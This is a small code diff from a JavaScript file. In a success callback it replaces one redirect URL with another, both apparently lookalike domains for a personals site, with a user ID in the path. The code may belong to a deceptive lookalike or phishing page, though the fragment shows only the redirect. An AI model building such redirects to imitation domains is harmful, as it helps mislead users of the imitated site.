@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://megapersonalsaa.shop/female-escort/${userId}`;
+                            window.location.href = `https://mp-view.my.id/female-escort/${userId}`;
                           }
                     
                 },
